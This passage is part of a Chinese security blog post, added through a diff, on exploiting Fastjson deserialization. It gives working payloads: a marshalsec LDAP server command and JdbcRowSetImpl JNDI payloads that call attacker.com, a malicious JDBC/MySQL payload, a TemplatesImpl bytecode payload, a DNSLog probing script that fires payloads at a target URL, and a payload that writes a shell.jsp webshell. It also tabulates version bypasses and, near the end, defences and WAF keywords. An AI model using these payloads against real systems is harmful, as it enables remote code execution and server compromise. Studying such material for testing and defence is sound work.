+<li><strong>Feature 绕过</strong>：<code>SupportNonPublicField</code>、<code>SupportAutoType</code> 等不当配置导致绕过</li>
+<li><strong>高版本 JDK 绕过</strong>：JDK 8u191+ 限制远程类加载后，转向本地 Gadget Chain + 特殊 JNDI Reference</li>
+<li><strong>白名单穿透</strong>：挖掘白名单类中可利用的 setter 方法</li>
+</ul>
+<h2 id="四、核心利用方式"><a href="#四、核心利用方式" class="headerlink" title="四、核心利用方式"></a>四、核心利用方式</h2><h3 id="4-1-JNDI-注入"><a href="#4-1-JNDI-注入" class="headerlink" title="4.1 JNDI 注入"></a>4.1 JNDI 注入</h3><p>最经典、最高效的利用方式：</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 启动恶意 LDAP 服务 (marshalsec)</span></span><br><span class="line">java -<span class="built_in">cp</span> marshalsec.jar marshalsec.jndi.LDAPRefServer http://attacker.com/#Exploit 1389</span><br></pre></td></tr></table></figure>
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://attacker.com:1389/Exploit&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><strong>利用条件：</strong> JDK &lt; 8u191 可远程加载字节码；高版本需结合本地 Gadget 或特殊 LDAP 返回。</p>
+<h3 id="4-2-JDBC-反序列化"><a href="#4-2-JDBC-反序列化" class="headerlink" title="4.2 JDBC 反序列化"></a>4.2 JDBC 反序列化</h3><p>利用恶意 MySQL 服务器返回序列化数据触发客户端反序列化：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.mysql.jdbc.JDBC4Connection&quot;</span><span class="punctuation">,</span><span class="attr">&quot;host&quot;</span><span class="punctuation">:</span><span class="string">&quot;evil_mysql&quot;</span><span class="punctuation">,</span><span class="attr">&quot;port&quot;</span><span class="punctuation">:</span><span class="number">3306</span><span class="punctuation">,</span><span class="attr">&quot;user&quot;</span><span class="punctuation">:</span><span class="string">&quot;detectCustomCollations&quot;</span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-3-TemplatesImpl-字节码执行（不出网）"><a href="#4-3-TemplatesImpl-字节码执行（不出网）" class="headerlink" title="4.3 TemplatesImpl 字节码执行（不出网）"></a>4.3 TemplatesImpl 字节码执行（不出网）</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">  <span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span> <span class="string">&quot;com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_bytecodes&quot;</span><span class="punctuation">:</span> <span class="punctuation">[</span><span class="string">&quot;yv66vgAAADQA...&quot;</span><span class="punctuation">]</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_name&quot;</span><span class="punctuation">:</span> <span class="string">&quot;pwn&quot;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_tfactory&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span><span class="punctuation">,</span></span><br><span class="line">  <span class="attr">&quot;_outputProperties&quot;</span><span class="punctuation">:</span> <span class="punctuation">&#123;</span><span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<p><code>getOutputProperties()</code> 加载 <code>_bytecodes</code> 中的恶意类，无需出网即可执行。</p>
+<h3 id="4-4-本地-Gadget-Chain"><a href="#4-4-本地-Gadget-Chain" class="headerlink" title="4.4 本地 Gadget Chain"></a>4.4 本地 Gadget Chain</h3><table>
+<thead>
+<tr>
+<th>利用类</th>
+<th>依赖</th>
+<th>触发机制</th>
+</tr>
+</thead>
+<tbody><tr>
+<td><code>C3P0ImplDataSource</code></td>
+<td>c3p0</td>
+<td>JNDI lookup</td>
+</tr>
+<tr>
+<td><code>JndiDataSourceFactory</code></td>
+<td>MyBatis</td>
+<td>JNDI lookup</td>
+</tr>
+<tr>
+<td><code>SimpleJndiBeanFactory</code></td>
+<td>Spring</td>
+<td>JNDI lookup</td>
+</tr>
+<tr>
+<td><code>BcelClassLoader</code></td>
+<td>Apache BCEL</td>
+<td>动态加载字节码</td>
+</tr>
+<tr>
+<td><code>GroovyClassLoader</code></td>
+<td>Groovy</td>
+<td>动态执行 Groovy 代码</td>
+</tr>
+</tbody></table>
+<h2 id="五、DNSLog-检测"><a href="#五、DNSLog-检测" class="headerlink" title="五、DNSLog 检测"></a>五、DNSLog 检测</h2><p>DNSLog 是检测 Fastjson 漏洞最常用的手段，通过构造 DNS 请求确认漏洞存在。</p>
+<h3 id="5-1-检测-Payload"><a href="#5-1-检测-Payload" class="headerlink" title="5.1 检测 Payload"></a>5.1 检测 Payload</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// Inet4Address 检测（最常用）</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet4Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// Inet6Address 检测</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.Inet6Address&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;xxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// URL 类检测</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;java.net.URL&quot;</span><span class="punctuation">,</span><span class="attr">&quot;val&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://xxxx.dnslog.cn&quot;</span><span class="punctuation">&#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">// JNDI + LDAP 检测</span></span><br><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;com.sun.rowset.JdbcRowSetImpl&quot;</span><span class="punctuation">,</span><span class="attr">&quot;dataSourceName&quot;</span><span class="punctuation">:</span><span class="string">&quot;ldap://xxxx.dnslog.cn/Exp&quot;</span><span class="punctuation">,</span><span class="attr">&quot;autoCommit&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">true</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="5-2-检测流程"><a href="#5-2-检测流程" class="headerlink" title="5.2 检测流程"></a>5.2 检测流程</h3><pre class="mermaid">flowchart TD
+    A["向目标发送 Fastjson Payload"] --> B["Payload 包含 DNSLog 子域名"]
+    B --> C{"目标执行反序列化?"}
+    C -->|存在漏洞| D["触发 DNS 查询"]
+    D --> E["DNSLog 平台收到记录"]
+    E --> F["确认漏洞存在"]
+    C -->|不存在漏洞| G["无 DNS 记录"]
+    G --> H["尝试其他版本 payload"]
+    H --> A</pre>
+
+<h3 id="5-3-自动化探测脚本"><a href="#5-3-自动化探测脚本" class="headerlink" title="5.3 自动化探测脚本"></a>5.3 自动化探测脚本</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests, uuid</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">check_fastjson</span>(<span class="params">url, dnslog</span>):</span><br><span class="line">    sub = <span class="built_in">str</span>(uuid.uuid4())[:<span class="number">8</span>]</span><br><span class="line">    payloads = [</span><br><span class="line">        <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;java.net.Inet4Address&quot;,&quot;val&quot;:&quot;%s.%s&quot;&#125;&#x27;</span> % (sub, dnslog),</span><br><span class="line">        <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;java.net.Inet6Address&quot;,&quot;val&quot;:&quot;%s.%s&quot;&#125;&#x27;</span> % (sub, dnslog),</span><br><span class="line">        <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;java.net.URL&quot;,&quot;val&quot;:&quot;http://%s.%s&quot;&#125;&#x27;</span> % (sub, dnslog),</span><br><span class="line">        <span class="string">&#x27;&#123;&quot;@type&quot;:&quot;java.net.InetSocketAddress&quot;&#123;&quot;address&quot;:,&quot;val&quot;:&quot;%s.%s&quot;&#125;&#125;&#x27;</span> % (sub, dnslog),</span><br><span class="line">    ]</span><br><span class="line">    <span class="keyword">for</span> p <span class="keyword">in</span> payloads:</span><br><span class="line">        <span class="keyword">try</span>:</span><br><span class="line">            requests.post(url, data=p, headers=&#123;<span class="string">&quot;Content-Type&quot;</span>:<span class="string">&quot;application/json&quot;</span>&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">except</span>:</span><br><span class="line">            <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">return</span> sub  <span class="comment"># 到 DNSLog 平台查询此子域名的记录</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="六、不出网利用"><a href="#六、不出网利用" class="headerlink" title="六、不出网利用"></a>六、不出网利用</h2><p>目标无网络回显时的利用方式：</p>
+<h3 id="6-1-写文件获取-WebShell"><a href="#6-1-写文件获取-WebShell" class="headerlink" title="6.1 写文件获取 WebShell"></a>6.1 写文件获取 WebShell</h3><figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span><span class="attr">&quot;@type&quot;</span><span class="punctuation">:</span><span class="string">&quot;org.apache.commons.io.output.FileWriterWithEncoding&quot;</span><span class="punctuation">,</span><span class="attr">&quot;file&quot;</span><span class="punctuation">:</span><span class="string">&quot;/webapps/ROOT/shell.jsp&quot;</span><span class="punctuation">,</span><span class="attr">&quot;encoding&quot;</span><span class="punctuation">:</span><span class="string">&quot;UTF-8&quot;</span><span class="punctuation">,</span><span class="attr">&quot;append&quot;</span><span class="punctuation">:</span><span class="literal"><span class="keyword">false</span></span><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="6-2-时间盲注"><a href="#6-2-时间盲注" class="headerlink" title="6.2 时间盲注"></a>6.2 时间盲注</h3><p>通过 sleep 延迟逐字节判断命令执行结果，适用于完全无回显场景。</p>
+<h3 id="6-3-内存马注入"><a href="#6-3-内存马注入" class="headerlink" title="6.3 内存马注入"></a>6.3 内存马注入</h3><p>利用 Spring&#x2F;Tomcat 机制动态注册 Filter&#x2F;Servlet&#x2F;Listener&#x2F;Controller，不落地文件：</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 通过 Fastjson 反序列化注入 Spring Controller</span></span><br><span class="line"><span class="comment">// 借助 RequestMappingHandlerMapping 注册恶意路由</span></span><br></pre></td></tr></table></figure>
+
+<h2 id="七、防御与修复"><a href="#七、防御与修复" class="headerlink" title="七、防御与修复"></a>七、防御与修复</h2><table>
+<thead>
+<tr>
+<th>措施</th>
+<th>操作</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>升级版本</td>
+<td>升级至 <strong>1.2.83 及以上版本</strong></td>
+</tr>
+<tr>
+<td>关闭 AutoType</td>
+<td><code>ParserConfig.getGlobalInstance().setAutoTypeSupport(false);</code></td>
+</tr>
+<tr>
+<td>开启 SafeMode</td>
+<td><code>ParserConfig.getGlobalInstance().setSafeMode(true);</code> (1.2.68+)</td>
+</tr>
+<tr>
+<td>WAF 规则</td>
+<td>拦截含 <code>@type</code>、<code>JdbcRowSetImpl</code>、<code>TemplatesImpl</code> 等关键词的请求</td>
+</tr>
+<tr>
+<td>升级 JDK</td>
+<td>JDK 8u191+ 并添加 <code>-Dcom.sun.jndi.ldap.object.trustURLCodebase=false</code></td>
+</tr>
+</tbody></table>
+<h2 id="八、总结"><a href="#八、总结" class="headerlink" title="八、总结"></a>八、总结</h2><p>Fastjson 的攻防史是一部典型的”打补丁→找绕过→再打补丁”猫鼠游戏。从无防御到 AutoType 开关、黑白名单、缓存控制、SafeMode 多层防线，官方付出了巨大成本。</p>
+<p>对攻防人员的价值：</p>
+<ol>
+<li><strong>覆盖面广</strong>——大量 Java 项目依赖 Fastjson</li>
+<li><strong>探测成本低</strong>——JNDI + DNSLog 组合简单高效</li>
+<li><strong>绕过思路经典</strong>——字符填充、缓存投毒、接口多态等技术可迁移至其他反序列化场景</li>
+</ol>
+<p>对开发者的核心原则：<strong>能关 AutoType 则关，能不用 Fastjson 则不用</strong>。必须使用时保持最新版本并配置 SafeMode。</p>
+<h2 id="附录：版本与利用总结表"><a href="#附录：版本与利用总结表" class="headerlink" title="附录：版本与利用总结表"></a>附录：版本与利用总结表</h2><table>
+<thead>
+<tr>
+<th>版本范围</th>
+<th>关键防御</th>
+<th>已知绕过</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>&lt;&#x3D; 1.2.24</td>
+<td>无</td>
+<td>JdbcRowSetImpl 直接 RCE</td>
+</tr>
+<tr>
+<td>1.2.25 - 1.2.32</td>
+<td>autoTypeSupport + 黑名单</td>
+<td>L; 绕过</td>
+</tr>
+<tr>
+<td>1.2.33 - 1.2.40</td>
+<td>修复 L;</td>
+<td>LL;; 双写绕过</td>
+</tr>
+<tr>
+<td>1.2.41 - 1.2.42</td>
+<td>修复 LL;;</td>
+<td>[ 数组绕过</td>
+</tr>
+<tr>
+<td>1.2.43 - 1.2.46</td>
+<td>黑名单扩充</td>
+<td>MyBatis &#x2F; TemplatesImpl 利用链</td>
+</tr>
+<tr>
+<td>1.2.47</td>
+<td>通用防御</td>
+<td>mappings 缓存投毒 (影响最广)</td>
+</tr>
+<tr>
+<td>1.2.48 - 1.2.67</td>
+<td>缓存修复 + expectClass</td>
+<td>Throwable 继承链</td>
+</tr>
+<tr>
+<td>1.2.68 - 1.2.79</td>
+<td>SafeMode 引入</td>
+<td>白名单穿透 + 新 Feature 绕过</td>
+</tr>
+<tr>
+<td>1.2.80 - 1.2.83</td>
+<td>黑&#x2F;白名单完善</td>
+<td>部分利用链残留</td>
+</tr>
+</tbody></table>
+<h2 id="免责声明"><a href="#免责声明" class="headerlink" title="免责声明"></a>免责声明</h2><p><strong>本文所述技术仅供安全研究与授权测试使用。未经授权对计算机信息系统进行渗透测试属于违法行为，可能导致民事或刑事责任。请务必在合法授权范围内进行安全测试。技术无罪，人心有责。</strong></p>
+
+    </div>
+
+    
+    
+    
+
+    <footer class="post-footer">
+          <div class="post-tags">
+              <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/" rel="tag"># 渗透测试</a>
+              <a href="/tags/%E6%A1%86%E6%9E%B6%E5%AE%89%E5%85%A8/" rel="tag"># 框架安全</a>
+              <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
+          </div>
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-item">
+                <a href="/Crypto-weak-exploitation/" rel="prev" title="加密算法漏洞：弱随机数与填充攻击">
+                  <i class="fa fa-angle-left"></i> 加密算法漏洞：弱随机数与填充攻击
+                </a>
+            </div>
+            <div class="post-nav-item">
+                <a href="/CMS-common-vulnerabilities/" rel="next" title="常见CMS漏洞挖掘思路">
+                  常见CMS漏洞挖掘思路 <i class="fa fa-angle-right"></i>
+                </a>
+            </div>
+          </div>
+    </footer>
+  </article>
+</div>
+
+
+
+
+
+
+</div>
+  </main>
+
+  <footer class="footer">
+    <div class="footer-inner">
+
+  <div class="copyright">
+    &copy; 
+    <span itemprop="copyrightYear">2026</span>
+    <span class="with-love">
+      <i class="fa fa-heart"></i>
+    </span>
+    <span class="author" itemprop="copyrightHolder">YunShang</span>
+  </div>
+  <div class="powered-by">由 <a href="https://hexo.io/" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.js.org/pisces/" rel="noopener" target="_blank">NexT.Pisces</a> 强力驱动
+  </div>
+
+    </div>
+  </footer>
+
+  
+  <div class="toggle sidebar-toggle" role="button">
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+    <span class="toggle-line"></span>
+  </div>
+  <div class="sidebar-dimmer"></div>
+  <div class="back-to-top" role="button" aria-label="返回顶部">
+    <i class="fa fa-arrow-up fa-lg"></i>
+    <span>0%</span>
+  </div>
+
+<noscript>
+  <div class="noscript-warning">Theme NexT works best with JavaScript enabled</div>
+</noscript>
+
+</body>
+</html>
